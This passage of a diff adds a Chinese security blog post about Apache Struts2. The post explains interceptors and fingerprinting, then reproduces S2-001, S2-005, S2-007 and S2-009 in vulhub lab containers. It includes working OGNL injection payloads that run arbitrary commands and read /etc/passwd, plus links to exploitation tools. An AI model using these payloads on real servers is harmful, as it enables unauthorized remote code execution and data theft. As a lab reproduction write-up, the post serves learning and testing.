class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一旦在某个包下定义了默认拦截器栈，在该包下的所有action都会使用此拦截器栈。对于那些不想使用这些拦截器栈的action，则应该将它放置在其它的包下【如：test1】</p>
+<p><strong>拦截器与过滤器的区别：</strong></p>
+<p> 　1.拦截器是基于java反射机制的，而过滤器是基于函数回调的。<br> 　2.过滤器依赖于servlet容器，而拦截器不依赖于servlet容器。<br>     3.拦截器只能对Action请求起作用，而过滤器则可以对几乎所有请求起作用。<br> 　4.拦截器可以访问Action上下文、值栈里的对象，而过滤器不能。<br> 　5.在Action的生命周期中，拦截器可以多次调用，而过滤器只能在容器初始化时被调用一次。</p>
+<h1 id="Struts2框架识别"><a href="#Struts2框架识别" class="headerlink" title="Struts2框架识别"></a>Struts2框架识别</h1><ul>
+<li>通过网页后缀来进行判断，如.do或者.action</li>
+</ul>
+<p><img src="/2023/08/06/struts2/image-20230806141036134.png"></p>
+<ul>
+<li>判断/struts/webconsole.html是否存在来进行判断，</li>
+</ul>
+<p>这个功能是开发人员调试时使用的，所以需要devMode为TRUE</p>
+<h1 id="Struts2漏洞复现"><a href="#Struts2漏洞复现" class="headerlink" title="Struts2漏洞复现"></a>Struts2漏洞复现</h1><h2 id="1、S2-001（OGNL-循环解析导致的-RCE-漏洞）"><a href="#1、S2-001（OGNL-循环解析导致的-RCE-漏洞）" class="headerlink" title="1、S2-001（OGNL 循环解析导致的 RCE 漏洞）"></a>1、S2-001（OGNL 循环解析导致的 RCE 漏洞）</h2><p><strong>漏洞原理</strong></p>
+<p>用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 <strong>OGNL</strong> 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">OGNL</span>是<span class="variable">Object</span><span class="operator">-</span><span class="built_in">Graph</span> <span class="variable">Navigation</span> <span class="built_in">Language</span>的缩写，它是一种功能强大的表达式语言（<span class="built_in">Expression</span> <span class="built_in">Language</span>，简称为<span class="variable">EL</span>），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。</span><br></pre></td></tr></table></figure>
+
+<h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Struts 2.0.0 - 2.0.8</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>本次测试使用 vulhub 靶场搭建</p>
+<p>vuluhub 靶场下载好后，进入本次的漏洞环境，并启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.../vulhub/struts2/s2-001</span><br><span class="line"></span><br><span class="line">docker-compose up -d //靶场的编译和运行</span><br><span class="line">docker-compose ps  //查看是否启动</span><br></pre></td></tr></table></figure>
+
+<p>如下界面说明搭建成功</p>
+<p><img src="/2023/08/06/struts2/image-20230806144628314.png"></p>
+<p>打开测试页面：ip:8080端口</p>
+<p><img src="/2023/08/06/struts2/image-20230806144741713.png"></p>
+<h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a><strong>POC:</strong></h5><p>1.在密码处输入<code>%&#123;&#39;123&#39;&#125;</code></p>
+<p>​    <img src="/2023/08/06/struts2/image-20230806144948409.png"></p>
+<p>2.点击提交</p>
+<p><img src="/2023/08/06/struts2/image-20230806145048232.png"></p>
+<p>3.成功解析 OGNL 表达式，即存在漏洞</p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a><strong>EXP:</strong></h5><ol>
+<li><p>获取 tomcat 路径：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">&quot;user.dir&quot;</span>)+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功返回</p>
+<p><img src="/2023/08/06/struts2/image-20230806145412608.png"></p>
+</li>
+</ol>
+<p>2.获取网站真实路径：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/struts2/image-20230806145648157.png"></p>
+<p>3.执行命令</p>
+<p>替换<code>命令</code>即可执行指令</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(<span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(<span class="params">new</span> <span class="params">java</span>.<span class="params">lang</span>.String[]&#123;<span class="string">&quot;命令&quot;</span>&#125;)</span>).redirect<span class="constructor">ErrorStream(<span class="params">true</span>)</span>.start<span class="literal">()</span>,</span><br><span class="line">#b=#a.get<span class="constructor">InputStream()</span>,</span><br><span class="line">#c=<span class="keyword">new</span> java.io.<span class="constructor">InputStreamReader(#<span class="params">b</span>)</span>,</span><br><span class="line">#d=<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(#<span class="params">c</span>)</span>,</span><br><span class="line">#e=<span class="keyword">new</span> <span class="built_in">char</span><span class="literal">[<span class="number">50000</span>]</span>,</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.get<span class="constructor">Writer()</span>.println(<span class="keyword">new</span> java.lang.<span class="constructor">String(#<span class="params">e</span>)</span>),</span><br><span class="line">#f.get<span class="constructor">Writer()</span>.flush<span class="literal">()</span>,#f.get<span class="constructor">Writer()</span>.close<span class="literal">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例如：替换<code>命令</code>为<code>whoami</code></p>
+<p><img src="/2023/08/06/struts2/image-20230806145828090.png"></p>
+<p>如果执行的命令之间有空格，需要分别用引号包含</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(<span class="keyword">new</span> java.lang.<span class="constructor">ProcessBuilder(<span class="params">new</span> <span class="params">java</span>.<span class="params">lang</span>.String[]&#123;<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>&#125;)</span>).redirect<span class="constructor">ErrorStream(<span class="params">true</span>)</span>.start<span class="literal">()</span>,</span><br><span class="line">#b=#a.get<span class="constructor">InputStream()</span>,</span><br><span class="line">#c=<span class="keyword">new</span> java.io.<span class="constructor">InputStreamReader(#<span class="params">b</span>)</span>,</span><br><span class="line">#d=<span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(#<span class="params">c</span>)</span>,</span><br><span class="line">#e=<span class="keyword">new</span> <span class="built_in">char</span><span class="literal">[<span class="number">50000</span>]</span>,</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.get<span class="constructor">Writer()</span>.println(<span class="keyword">new</span> java.lang.<span class="constructor">String(#<span class="params">e</span>)</span>),</span><br><span class="line">#f.get<span class="constructor">Writer()</span>.flush<span class="literal">()</span>,#f.get<span class="constructor">Writer()</span>.close<span class="literal">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、S2-005（S2-003-的绕过）"><a href="#2、S2-005（S2-003-的绕过）" class="headerlink" title="2、S2-005（S2-003 的绕过）"></a>2、S2-005（S2-003 的绕过）</h2><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h5><p>s2-005漏洞源于S2-003(受影响版本：低于Struts 2.0.12)，struts2会将 http 的每个参数名解析为 OGNL 语句执行(可理解为java代码)。OGNL表达式通过#来访问 Struts 的对象，Struts框架通过过滤#字符防止安全问题，然而通过 unicode 编码(\u0023)或8进制(\43)就可以绕过安全限制。</p>
+<p>对于S2-003漏洞，官方通过增加安全配置即沙盒机制（禁止静态方法allowStaticMethodAcces、MethodAccessor.denyMethodExecution调用和类方法执行等）来修补，但是攻击者可以利用OGNL表达式将 allowStaticMethodAccess设置为true，MethodAccessor.denyMethodExecution设置为false，就可以绕过这个沙盒机制导致S2-005漏洞。</p>
+<p>也就是说S2-005漏洞是对S2-003漏洞补丁的绕过</p>
+<h5 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h5><p>Struts 2.0.0 - Struts 2.1.8.1</p>
+<h5 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h5><p>同1</p>
+<p>访问ip:8080出现如下界面说明环境搭建成功</p>
+<p><img src="/2023/08/06/struts2/image-20230806151106482.png"></p>
+<h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h5><p>1.执行任意命令(无回显，空格用@代替)</p>
+<p>这个 POC会创建一个success文件</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(<span class="variable">%27</span><span class="variable">%5</span>cu<span class="number">0023</span>_memberAccess[<span class="variable">%5</span><span class="keyword">c</span><span class="variable">%27</span>allowStaticMethodAccess<span class="variable">%5</span><span class="keyword">c</span><span class="variable">%27</span>]<span class="variable">%27</span>)(vaaa)<span class="operator">=</span><span class="keyword">true</span>&amp;(aaaa)((<span class="variable">%27</span><span class="variable">%5</span>cu<span class="number">0023</span>context[<span class="variable">%5</span><span class="keyword">c</span><span class="variable">%27</span>xwork.MethodAccessor.denyMethodExecution<span class="variable">%5</span><span class="keyword">c</span><span class="variable">%27</span>]<span class="variable">%5</span>cu<span class="number">003</span>d<span class="variable">%5</span>cu<span class="number">0023</span>vccc<span class="variable">%27</span>)(<span class="variable">%5</span>cu<span class="number">0023</span>vccc<span class="variable">%5</span>cu<span class="number">003</span>dnew<span class="variable">%20</span>java.lang.Boolean(<span class="variable">%22</span><span class="keyword">false</span><span class="variable">%22</span>)))&amp;(asdf)((&#x27;<span class="variable">%5</span>cu<span class="number">0023</span>rt.exec(<span class="variable">%22</span>touch@/tmp/success<span class="variable">%22</span>.split(<span class="variable">%22</span>@<span class="variable">%22</span>))&#x27;)(<span class="variable">%5</span>cu<span class="number">0023</span>rt<span class="variable">%5</span>cu<span class="number">003</span>d<span class="title">@java.lang.Runtime</span><span class="title">@getRuntime</span>()))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包添加 payload，往/tmp/目录下写入success文件</p>
+<p><img src="/2023/08/06/struts2/image-20230806151816397.png"></p>
+<p>进入容器查看发现成功创建success文件</p>
+<p><strong>注意</strong>：是进入容器！</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps <span class="comment">#查看当前运行的容器</span></span><br><span class="line">docker exec -it CONTAINER-ID bash  <span class="comment"># 获取容器bash</span></span><br><span class="line">ls <span class="regexp">/tmp/</span> <span class="comment">#查看容器目录</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/struts2/image-20230806152648146.png"></p>
+<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p>需要使用工具</p>
+<p>1.工具1</p>
+<p>下载地链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GnubCDegksD0GYZcbAcfHg%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9A1111">https://pan.baidu.com/s/1GnubCDegksD0GYZcbAcfHg，提取码：1111</a></p>
+<ul>
+<li><p>获取目标信息</p>
+<p><img src="/2023/08/06/struts2/image-20230806154733291.png"></p>
+</li>
+<li><p>执行命令</p>
+<p><img src="/2023/08/06/struts2/image-20230806154902399.png"></p>
+</li>
+</ul>
+<p>2.工具2</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1a87zkitH5nzN9KVJWEhgSg%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9A1111">https://pan.baidu.com/s/1a87zkitH5nzN9KVJWEhgSg，提取码：1111</a></p>
+<p><img src="/2023/08/06/struts2/image-20230806155924314.png"></p>
+<p>…这个工具有点强大</p>
+<h2 id="3、S2-007（验证类型转换错误时，会导致二次表达式解析）"><a href="#3、S2-007（验证类型转换错误时，会导致二次表达式解析）" class="headerlink" title="3、S2-007（验证类型转换错误时，会导致二次表达式解析）"></a>3、S2-007（验证类型转换错误时，会导致二次表达式解析）</h2><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h5><p>S2-007漏洞一般出现在表单处，当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p>
+<p>例如下面这个 UserAction-validation.xml 验证表单</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">validators</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式</p>
+<h5 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h5><p>Struts 2.0.0-2.2.3</p>
+<h5 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h5><p>同上</p>
+<p>搭好后ip:8080界面如下：</p>
+<p><img src="/2023/08/06/struts2/image-20230806161939193.png"></p>
+<h5 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h5><p>在年龄age框中输入下面的非数字类型值，点击登陆，name和email随便输</p>
+<p>payload的两端加<code>&#39;+ +&#39;</code>是为了闭合这里 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 两端的引号，放入的value值变成了<code>&#39;&#39;+(#xxxx)+&#39;&#39;</code>的形式才可以成功解析</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+(1+1)+&#x27;  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/struts2/image-20230806162117783.png"></p>
+<p>年龄框的非数字字符变成了11，证明漏洞存在</p>
+<h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><p>在年龄age框输入要执行的任意代码的EXP，点击提交，页面会返回响应的执行结果</p>
+<p>执行任意命令EXP(id)</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess<span class="literal">[&quot;<span class="identifier">allowStaticMethodAccess</span>&quot;]</span>=<span class="literal">true</span>,#foo=<span class="keyword">new</span> java.lang.<span class="constructor">Boolean(<span class="string">&quot;false&quot;</span>)</span> ,#context<span class="literal">[&quot;<span class="identifier">xwork</span>.M<span class="identifier">ethodAccessor</span>.<span class="identifier">denyMethodExecution</span>&quot;]</span>=#foo,@org.apache.commons.io.IOUtils@<span class="keyword">to</span><span class="constructor">String(@<span class="params">java</span>.<span class="params">lang</span>.Runtime@<span class="params">getRuntime</span>()</span>.exec(&#x27;id&#x27;).get<span class="constructor">InputStream()</span>)) + &#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/struts2/image-20230806162610086.png"></p>
+<p>cat /etc/passwd:</p>
+<p><img src="/2023/08/06/struts2/image-20230806163003424.png"></p>
+<h2 id="4、S2-009-远程代码执行漏洞-CVE-2011-3923"><a href="#4、S2-009-远程代码执行漏洞-CVE-2011-3923" class="headerlink" title="4、S2-009 远程代码执行漏洞 (CVE-2011-3923)"></a>4、S2-009 远程代码执行漏洞 (CVE-2011-3923)</h2><h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2 对 s2-003 的修复方法是禁止#号，于是 s2-005 通过使用编码\u0023或\43来绕过；后来 Struts2 对 s2-005 的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p>
+<p>但是，如果当前 action 中接受了某个参数 example，这个参数将进入 OGNL 的上下文。所以，我们可以将 OGNL 表达式放在 example 参数中，然后使用 /helloword.acton?example=<OGNL statement>&amp;(example)(‘xxx’)=1 的方法来执行它，从而绕过官方对#、\ 等特殊字符的防御</OGNL></p>
+<h5 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h5><p>Struts 2.1.0-2.3.1.1</p>
+<h5 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>同上</p>
+<p>搭建成功访问ip:8080如下：</p>
+<p><img src="/2023/08/06/struts2/image-20230806163417260.png"></p>
+<h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h5><p>我们的目标是去找一个接受了参数，参数类型是 string 的 action。在源码中可以找到这个文件<br>WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example5Action</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2111967621952300611L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123; <span class="keyword">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123; <span class="keyword">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，其接受了 name 参数并调用 setName 将其赋值给私有属性 this.name，正是符合我们的要求。然后去 WEB-INF/src/java/struts-ajax.xml 看一下 URL 路由：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;ajax&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;example5&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/ajax/tabbedpanel/example5.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/ajax/tabbedpanel/example5Ok.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>name=example5，所以访问 <a target="_blank" rel="noopener" href="http://ip:8080/ajax/example5.action">http://ip:8080/ajax/example5.action</a> 即可访问该控制器。按照原理中说到的方法，将 OGNL 利用代码放在 name 参数里，即可利用该漏洞：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">age<span class="operator">=</span><span class="number">123</span>&amp;name<span class="operator">=</span>(#context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]<span class="operator">=</span>+new+java.lang.Boolean(<span class="keyword">false</span>)<span class="punctuation">,</span>+#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]<span class="operator">=</span><span class="keyword">true</span><span class="punctuation">,</span>+#a<span class="operator">=</span><span class="title">@java.lang.Runtime</span><span class="title">@getRuntime</span>().exec(<span class="string">&quot;[命令]&quot;</span>).getInputStream()<span class="punctuation">,</span>#b<span class="operator">=</span>new+java.io.InputStreamReader(#a)<span class="punctuation">,</span>#<span class="keyword">c</span><span class="operator">=</span>new+java.io.BufferedReader(#b)<span class="punctuation">,</span>#d<span class="operator">=</span>new+char[<span class="number">51020</span>]<span class="punctuation">,</span>#<span class="keyword">c</span>.read(#d)<span class="punctuation">,</span>#kxlzx<span class="operator">=</span><span class="title">@org.apache.struts2.ServletActionContext</span><span class="title">@getResponse</span>().getWriter()<span class="punctuation">,</span>#kxlzx.println(#d)<span class="punctuation">,</span>#kxlzx.close())(meh)&amp;z[(name)(&#x27;meh&#x27;)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?age<span class="operator">=</span><span class="number">123</span>&amp;name<span class="operator">=</span>(<span class="variable">%23</span>context[<span class="variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="variable">%22</span>]<span class="operator">=</span>+new+java.lang.Boolean(<span class="keyword">false</span>)<span class="punctuation">,</span>+<span class="variable">%23</span>_memberAccess[<span class="variable">%22</span>allowStaticMethodAccess<span class="variable">%22</span>]<span class="operator">=</span><span class="keyword">true</span><span class="punctuation">,</span>+<span class="variable">%23</span>a<span class="operator">=</span><span class="title">@java.lang.Runtime</span><span class="title">@getRuntime</span>().exec(<span class="variable">%22</span>id<span class="variable">%22</span>).getInputStream()<span class="punctuation">,</span><span class="variable">%23</span>b<span class="operator">=</span>new+java.io.InputStreamReader(<span class="variable">%23</span>a)<span class="punctuation">,</span><span class="variable">%23</span><span class="keyword">c</span><span class="operator">=</span>new+java.io.BufferedReader(<span class="variable">%23</span>b)<span class="punctuation">,</span><span class="variable">%23</span>d<span class="operator">=</span>new+char[<span class="number">51020</span>]<span class="punctuation">,</span><span class="variable">%23</span><span class="keyword">c</span>.read(<span class="variable">%23</span>d)<span class="punctuation">,</span><span class="variable">%23</span>kxlzx<span class="operator">=</span><span class="title">@org.apache.struts2.ServletActionContext</span><span class="title">@getResponse</span>().getWriter()<span class="punctuation">,</span><span class="variable">%23</span>kxlzx.println(<span class="variable">%23</span>d)<span class="punctuation">,</span><span class="variable">%23</span>kxlzx.close())(meh)<span class="variable">%23</span>z[(name)(<span class="variable">%27</span>meh<span class="variable">%27</span>)]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cmyxn/p/5700781.html">https://www.cnblogs.com/cmyxn/p/5700781.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43531669/article/details/124970785?ops_request_misc=%7B%22request_id%22:%22169130304916777224416595%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169130304916777224416595&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-124970785-null-null.142%5Ev92%5Einsert_down28v1&utm_term=struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1018.2226.3001.4187">Struts2漏洞分析与复现合集_apache struts 2_未完成的歌~的博客-CSDN博客</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/05/thinkphp/" rel="prev" title="Thinkphp">
+      <i class="fa fa-chevron-left"></i> Thinkphp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
